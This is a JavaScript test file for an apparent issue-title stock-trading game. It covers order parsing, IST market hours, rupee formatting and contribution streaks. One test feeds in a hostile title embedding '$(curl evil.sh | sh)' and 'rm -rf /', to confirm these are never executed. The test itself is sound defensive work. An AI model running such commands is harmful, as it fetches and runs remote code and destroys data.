import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parseOrder, isOrderTitle, orderUrl } from '../scripts/lib/orders.js';
import { marketClock, isMarketOpen, nextOpenDate } from '../scripts/lib/time.js';
import { rupees, snap, signed } from '../scripts/lib/money.js';
import { parseCalendarHtml, derive } from '../scripts/lib/stats.js';
import { cfg, ist, issue, MON, FRI, SAT } from './helpers.js';

test('order titles parse leniently but strictly bound the quantity', () => {
  const parse = (title) => parseOrder(issue('x', title), cfg);
  assert.deepEqual([parse('BUY 5 $VJK').side, parse('BUY 5 $VJK').qty], ['buy', 5]);
  assert.deepEqual([parse('sell 10 vjk').side, parse('sell 10 vjk').qty], ['sell', 10]);
  assert.ok(parse('BUY 0 $VJK').error);
  assert.ok(parse('BUY 26 $VJK').error);
  assert.ok(parse('BUY 99999999 $VJK').error);
  assert.ok(parse('to the moon $VJK').error);
  // Hostile titles are only matched, never executed or echoed.
  const hostile = parse('BUY 5 $VJK $(curl evil.sh | sh) `rm -rf /`');
  assert.deepEqual([hostile.side, hostile.qty, hostile.error], ['buy', 5, undefined]);
});

test('only issues mentioning the symbol are treated as orders', () => {
  assert.ok(isOrderTitle('BUY 5 $VJK', cfg));
  assert.ok(isOrderTitle('vjk sell 1', cfg));
  assert.ok(!isOrderTitle('Typo in README', cfg));
  assert.ok(!isOrderTitle('VJKX buy 5', cfg));
});

test('order links pre-fill a parseable title', () => {
  const url = new URL(orderUrl(cfg, 'buy', 5));
  assert.equal(url.searchParams.get('title'), 'BUY 5 $VJK');
  assert.equal(parseOrder(issue('x', url.searchParams.get('title')), cfg).qty, 5);
});

test('the market clock runs on IST regardless of the runner timezone', () => {
  assert.deepEqual(marketClock(new Date('2026-10-05T19:00:00Z'), cfg.market), { date: '2026-10-06', minutes: 30 });
  assert.equal(isMarketOpen(ist(MON, '09:14'), cfg.market), false);
  assert.equal(isMarketOpen(ist(MON, '09:15'), cfg.market), true);
  assert.equal(isMarketOpen(ist(MON, '15:29'), cfg.market), true);
  assert.equal(isMarketOpen(ist(MON, '15:30'), cfg.market), false);
  assert.equal(isMarketOpen(ist(SAT, '11:00'), cfg.market), false);
  assert.equal(isMarketOpen(ist(MON, '11:00'), { ...cfg.market, holidays: [MON] }), false);
  assert.equal(nextOpenDate(ist(FRI, '16:00'), cfg.market), '2026-10-12');
  assert.equal(nextOpenDate(ist(MON, '08:00'), cfg.market), MON);
});

test('money formats with Indian grouping and snaps to the tick', () => {
  assert.equal(rupees(10_000_000), '₹1,00,000.00');
  assert.equal(rupees(6535), '₹65.35');
  assert.equal(snap(10233, 5), 10235);
  assert.equal(snap(1, 5), 5);
  assert.equal(signed(-0.001), '+0.00');
  assert.equal(signed(-1.234), '-1.23');
});

test('the public contribution calendar parses and streaks count through today', () => {
  const html = ['2026-10-03', '2026-10-04', '2026-10-05']
    .map((d, i) => `<td data-date="${d}" id="contribution-day-component-${i}-0" data-level="1"></td>`
      + `<tool-tip for="contribution-day-component-${i}-0" popover="manual">${[2, 3, 0][i] || 'No'} contribution${i === 0 ? 's' : ''} on Oct ${3 + i}.</tool-tip>`)
    .join('');
  const calendar = parseCalendarHtml(html);
  assert.deepEqual(calendar, [{ d: '2026-10-03', c: 2 }, { d: '2026-10-04', c: 3 }, { d: '2026-10-05', c: 0 }]);
  const d = derive({ calendar });
  assert.equal(d.streak, 2, 'no commits yet today does not break the streak');
  assert.equal(d.best, 2);
  assert.equal(d.last30, 5);
});
